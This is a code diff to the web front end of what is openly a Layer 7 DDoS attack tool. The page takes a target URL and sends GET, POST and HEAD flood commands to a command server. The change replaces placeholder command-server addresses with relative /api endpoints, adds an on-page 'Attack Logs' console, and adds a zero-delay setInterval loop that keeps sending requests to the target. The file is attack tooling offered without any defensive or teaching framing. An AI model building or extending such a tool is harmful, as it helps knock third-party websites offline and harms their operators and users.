@@ -39,6 +39,17 @@
         button:hover {
             background-color: #0056b3;
         }
+        #console {
+            margin-top: 20px;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .log {
+            color: #333;
+            margin-bottom: 5px;
+        }
     </style>
 </head>
 <body>
@@ -55,7 +66,14 @@
     </form>
     <button onclick="stopAttack()">Stop Attack</button>
 
+    <div id="console">
+        <h2>Attack Logs</h2>
+        <div id="logContainer"></div>
+    </div>
+
     <script>
+        const logContainer = document.getElementById('logContainer');
+
         document.getElementById('attackForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
@@ -72,7 +90,7 @@
         function startLayer7Attacks(targetURL) {
             const attacks = ['GET', 'POST', 'HEAD'];
             attacks.forEach(attackType => {
-                fetch('http://<command_server_ip>:3000/start', {
+                fetch(`/api/start`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -80,7 +98,11 @@
                     body: JSON.stringify({ targetURL, attackType })
                 }).then(response => response.text())
                   .then(data => {
-                    alert(`Started ${attackType} attack: ${data}`);
+                    log(`Started ${attackType} attack: ${data}`);
+                    log(`Continuing ${attackType} attack until target reaches limit...`);
+                    const interval = setInterval(() => {
+                        sendRequest(attackType, targetURL);
+                    }, 0);
                   });
             });
         }
@@ -94,26 +116,34 @@
 
         async function sendPacket(target, attackType) {
             try {
-                await fetch(`http://<command_server_ip>:3000/send${attackType.toLowerCase()}`, {
+                await fetch(`/api/send${attackType.toLowerCase()}`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({ target })
                 });
-                console.log(`${attackType} packet sent to ${target}`);
+                log(`${attackType} packet sent to ${target}`);
             } catch (error) {
-                console.error(`Error sending ${attackType} packet: ${error}`);
+                log(`Error sending ${attackType} packet: ${error}`);
             }
         }
 
         function stopAttack() {
-            fetch('http://<command_server_ip>:3000/stop', {
+            fetch('/api/stop', {
                 method: 'POST'
             }).then(response => response.text())
               .then(data => {
-                alert(data);
+                log(data);
               });
+        }
+
+        function log(message) {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log';
+            logEntry.textContent = message;
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight; // Auto-scroll to bottom
         }
     </script>
 </body>
